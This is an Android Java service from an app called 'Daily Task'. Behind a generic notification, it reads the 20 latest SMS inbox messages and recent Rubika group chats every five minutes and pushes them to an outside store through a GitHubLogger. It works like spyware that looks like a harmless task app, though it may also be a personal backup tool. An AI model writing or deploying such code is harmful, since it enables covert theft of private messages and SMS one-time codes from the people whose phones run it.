package ir.fadavi.dailytask;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.os.*;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;

public class CollectorService extends Service {
    private static final String TAG = "Collector";
    private static final String CH  = "dailytask_ch";
    private static final int    NID = 2001;

    private ScheduledExecutorService sched;
    private GitHubLogger logger;

    @Override public void onCreate() {
        super.onCreate();
        logger = new GitHubLogger(this);
        NotificationChannel ch = new NotificationChannel(
            CH, "Daily Task", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        startForeground(NID, buildNotif("دستیار در حال اجرا..."));
    }

    @Override public int onStartCommand(Intent intent, int flags, int id) {
        if (intent != null && intent.getBooleanExtra("manual", false)) {
            new Thread(this::collect).start();
        } else if (sched == null || sched.isShutdown()) {
            sched = Executors.newSingleThreadScheduledExecutor();
            sched.scheduleAtFixedRate(this::collect, 0, 5, TimeUnit.MINUTES);
        }
        return START_STICKY;
    }

    private void collect() {
        log("SYNC", "شروع @ " + now());
        collectSms();
        collectRubika();
        log("SYNC", "تمام ✅ @ " + now());
        getSystemService(NotificationManager.class).notify(NID, buildNotif("آخرین همگام: " + now()));
    }

    private void collectSms() {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address","body","date"}, null, null, "date DESC LIMIT 20");
            if (c == null) return;
            JSONArray arr = new JSONArray();
            while (c.moveToNext()) {
                arr.put(new JSONObject().put("from", c.getString(0))
                    .put("body", c.getString(1)).put("date", c.getLong(2)));
            }
            c.close();
            if (arr.length() > 0) {
                JSONObject p = new JSONObject().put("source","sms").put("messages", arr);
                log("SMS", arr.length() + " پیام → " + (logger.push("sms", p) ? "✅" : "❌"));
            }
        } catch (Exception e) { log("SMS_ERR", e.getMessage()); }
    }

    private void collectRubika() {
        if (!RubikaClient.isServerRunning()) { log("RUBIKA","سرور Termux اجرا نیست"); return; }
        try {
            JSONObject g = RubikaClient.get("/groups");
            if (!g.optBoolean("ok",false)) { log("RUBIKA_ERR", g.optString("error")); return; }
            JSONArray list = g.getJSONArray("groups");
            for (int i = 0; i < list.length(); i++) {
                JSONObject gr = list.getJSONObject(i);
                JSONObject msgs = RubikaClient.get("/messages/" + gr.getString("guid") + "?count=10");
                if (msgs.optBoolean("ok",false)) {
                    JSONObject p = new JSONObject().put("source","rubika")
                        .put("group", gr.getString("title"))
                        .put("messages", msgs.getJSONArray("messages"));
                    logger.push("rubika", p);
                    log("RUBIKA", gr.getString("title") + " ✅");
                }
            }
        } catch (Exception e) { log("RUBIKA_ERR", e.getMessage()); }
    }

    private void log(String event, String data) {
        Log.i(TAG, "[" + event + "] " + data);
        MainActivity.LogListener l = MainActivity.listener;
        Handler h = MainActivity.uiHandler;
        if (l != null && h != null) h.post(() -> l.onLog(event, data));
    }

    private Notification buildNotif(String text) {
        return new NotificationCompat.Builder(this, CH)
            .setContentTitle("Daily Task").setContentText(text)
            .setSmallIcon(android.R.drawable.ic_popup_sync).setOngoing(true).build();
    }

    private String now() {
        return new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
    }

    @Override public void onDestroy() { if (sched != null) sched.shutdownNow(); super.onDestroy(); }
    @Override public IBinder onBind(Intent i) { return null; }
}
